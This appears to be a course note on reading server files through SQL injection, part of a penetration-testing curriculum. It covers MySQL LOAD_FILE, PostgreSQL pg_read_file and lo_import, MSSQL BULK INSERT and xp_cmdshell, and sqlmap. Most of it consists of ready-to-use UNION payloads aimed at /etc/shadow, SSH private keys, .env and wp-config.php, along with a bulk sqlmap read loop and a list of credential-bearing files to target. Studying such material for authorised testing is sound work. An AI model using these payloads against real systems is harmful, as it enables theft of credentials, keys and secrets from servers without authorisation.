---
tags: [vapt, sqli, advanced]
difficulty: advanced
module: "06 - SQL Injection"
topic: "06.24 Reading Files via SQLi (LOAD_FILE)"
---

# 06.24 — Reading Files via SQLi (LOAD_FILE)

## Overview

Certain databases allow SQL to read files from the OS filesystem. When combined with SQL injection, an attacker can read sensitive files like configuration files, private keys, /etc/passwd, and source code.

```
FILE READ REQUIREMENTS:
  MySQL:      FILE privilege granted to current DB user
              @@secure_file_priv = '' or NULL or accessible path
              File must be readable by MySQL process (mysql user)
  
  PostgreSQL: pg_read_file() requires superuser
              OR: large objects (lo_import) requires superuser
  
  MSSQL:      BULK INSERT requires appropriate permissions
              xp_cmdshell → type command (requires sysadmin)
  
  Oracle:     UTL_FILE requires DIRECTORY object + privileges
              pg_read_file equivalent: requires DBA
```

---

## MySQL LOAD_FILE()

```sql
-- CHECK IF FILE READ WORKS:
SELECT LOAD_FILE('/etc/passwd')
-- NULL → no permission
-- File content → FILE privilege granted!

-- CHECK PRIVILEGE:
SELECT file_priv FROM mysql.user WHERE user=user()
-- 'Y' → has FILE privilege!

-- CHECK secure_file_priv RESTRICTION:
SELECT @@secure_file_priv
-- NULL or '' → any file readable!
-- '/var/lib/mysql/' → only files in that path

-- READ FILES VIA UNION SQLI:
' UNION SELECT NULL, LOAD_FILE('/etc/passwd'), NULL--
' UNION SELECT NULL, LOAD_FILE('/etc/shadow'), NULL--         -- requires root
' UNION SELECT NULL, LOAD_FILE('/var/www/html/config.php'), NULL--  -- source code!
' UNION SELECT NULL, LOAD_FILE('/proc/self/environ'), NULL--       -- env vars!
' UNION SELECT NULL, LOAD_FILE('/proc/self/cmdline'), NULL--       -- command line
' UNION SELECT NULL, LOAD_FILE('/etc/mysql/my.cnf'), NULL--        -- MySQL config

-- PHPINFO:
' UNION SELECT NULL, LOAD_FILE('/var/www/html/phpinfo.php'), NULL--

-- WEB APP CONFIG FILES:
' UNION SELECT NULL, LOAD_FILE('/var/www/html/.env'), NULL--
' UNION SELECT NULL, LOAD_FILE('/var/www/html/wp-config.php'), NULL--  -- WordPress!
' UNION SELECT NULL, LOAD_FILE('/var/www/html/config/database.php'), NULL-- -- Laravel
' UNION SELECT NULL, LOAD_FILE('/etc/apache2/sites-enabled/000-default.conf'), NULL--

-- SSH KEYS:
' UNION SELECT NULL, LOAD_FILE('/root/.ssh/id_rsa'), NULL--
' UNION SELECT NULL, LOAD_FILE('/home/www-data/.ssh/id_rsa'), NULL--

-- NULL BYTES (bypass extension checks):
' UNION SELECT NULL, LOAD_FILE('/etc/passwd%00'), NULL--  -- null byte (old PHP)

-- HEX OUTPUT (if content contains special chars):
' UNION SELECT NULL, HEX(LOAD_FILE('/etc/passwd')), NULL--
-- Then decode: python3 -c "print(bytes.fromhex('content_here').decode())"
```

---

## MySQL PATH Discovery

To read the right files, first find the webroot:

```sql
-- FIND WEBROOT VIA PHP ERRORS (cause error on a PHP page):
-- The error message often shows the full path!
-- Example: "include(/var/www/html/includes/config.php): failed to open stream"

-- FIND VIA ENV VARIABLES:
SELECT LOAD_FILE('/proc/self/environ')
-- DOCUMENT_ROOT=/var/www/html → webroot found!

-- FIND VIA phpinfo:
SELECT LOAD_FILE('/proc/self/environ')
-- OR trigger phpinfo.php directly

-- FIND VIA APACHE/NGINX CONFIG:
SELECT LOAD_FILE('/etc/apache2/sites-enabled/000-default.conf')
-- DocumentRoot /var/www/html → webroot!

SELECT LOAD_FILE('/etc/nginx/sites-enabled/default')
-- root /var/www/html; → webroot!

-- MySQL DATA DIRECTORY (shows where DB files are stored):
SELECT @@datadir
-- /var/lib/mysql/ → not usually useful for reading app files

-- CWD (current working directory - often webroot):
SELECT LOAD_FILE('/proc/self/cwd')  -- symlink → actual path
```

---

## PostgreSQL File Read

```sql
-- pg_read_file() (requires superuser!):
SELECT pg_read_file('/etc/passwd')
SELECT pg_read_file('/var/www/html/config.php')
SELECT pg_read_file('/etc/postgresql/14/main/postgresql.conf')

-- WITH OFFSET AND LENGTH:
SELECT pg_read_file('/etc/passwd', 0, 1000)  -- first 1000 bytes

-- pg_read_binary_file() (for binary files):
SELECT encode(pg_read_binary_file('/etc/passwd'), 'base64')

-- LARGE OBJECTS (requires superuser):
-- Import file as large object:
SELECT lo_import('/etc/passwd')   -- returns oid (e.g., 16789)
-- Read it:
SELECT lo_get(16789)
-- OR: encode to readable:
SELECT encode(lo_get(16789), 'escape')

-- COPY TO READ (stores in table):
CREATE TABLE tmp (data TEXT);
COPY tmp FROM '/etc/passwd';
SELECT string_agg(data, E'\n') FROM tmp;
-- This reads file line by line into the table!

-- VIA UNION (with superuser):
' UNION SELECT NULL, pg_read_file('/etc/passwd')--
```

---

## MSSQL File Read

```sql
-- BULK INSERT (reads file into table):
CREATE TABLE #tmp (line VARCHAR(8000))
BULK INSERT #tmp FROM 'C:\Windows\win.ini'
SELECT * FROM #tmp
-- Then in UNION: UNION SELECT NULL, line FROM #tmp--

-- xp_cmdshell (requires sysadmin):
EXEC xp_cmdshell 'type C:\inetpub\wwwroot\web.config'

-- OPENROWSET:
SELECT * FROM OPENROWSET(BULK 'C:\Windows\win.ini', SINGLE_CLOB) AS x

-- READ SPECIFIC CONFIG FILES:
-- Web.config (ASP.NET):
EXEC xp_cmdshell 'type C:\inetpub\wwwroot\web.config'
-- → Contains connectionStrings with DB credentials!

-- Read registry (credentials):
EXEC xp_cmdshell 'reg query HKLM\SYSTEM\CurrentControlSet\Services\MSSQLServer'
```

---

## High-Value Files to Read

```
LINUX:
  /etc/passwd               → user list, UID, homedir
  /etc/shadow               → hashed passwords (requires root/mysql user)
  /etc/hosts                → internal network map
  /proc/self/environ        → current process environment (db password!)
  /proc/self/cmdline        → current process command line
  /proc/net/tcp             → open ports
  ~/.ssh/id_rsa             → SSH private key
  ~/.bash_history           → command history
  /var/www/html/.env        → environment file (API keys, DB pass)
  /var/www/html/config.php  → web app config
  /etc/apache2/htpasswd     → htpasswd credentials
  /etc/nginx/nginx.conf     → nginx config
  /etc/crontab              → cron jobs

WINDOWS:
  C:\Windows\win.ini          → basic Windows info
  C:\Windows\System32\drivers\etc\hosts  → hosts file
  C:\inetpub\wwwroot\web.config          → ASP.NET config (DB credentials!)
  C:\Windows\System32\config\SAM         → Windows password hashes (usually locked)
  C:\Users\Administrator\.ssh\id_rsa     → SSH key
  C:\xampp\htdocs\config.php             → XAMPP app config
  C:\wamp\www\config.php                 → WAMP app config

CMS SPECIFIC:
  /var/www/html/wp-config.php           → WordPress (DB credentials!)
  /var/www/html/config/config.php       → Many apps
  /var/www/html/application/config/database.php  → CodeIgniter
  /var/www/html/.env                    → Laravel/Symfony (APP_KEY, DB_PASS!)
  /var/www/html/config/settings.py      → Django settings (SECRET_KEY!)
```

---

## sqlmap File Read

```bash
# VIA SQLMAP:
sqlmap -u "https://target.com/?id=1" --file-read="/etc/passwd"
sqlmap -u "https://target.com/?id=1" --file-read="/var/www/html/.env"
sqlmap -u "https://target.com/?id=1" --file-read="/var/www/html/config.php"

# FILE STORED IN sqlmap OUTPUT:
# ~/.local/share/sqlmap/output/target.com/files/etc/passwd

# BULK READ:
for f in "/etc/passwd" "/etc/hosts" "/var/www/html/.env" "/var/www/html/config.php"; do
  sqlmap -u "https://target.com/?id=1" --file-read="$f" --batch
done
```

---

## Related Notes
- [[15 - MySQL Specific Payloads]] — LOAD_FILE details
- [[25 - Writing Files via SQLi]] — write webshell from SQLi
- [[04 - Union-Based SQLi]] — UNION-based file extraction
- [[21 - sqlmap Full Usage Guide]] — sqlmap file read
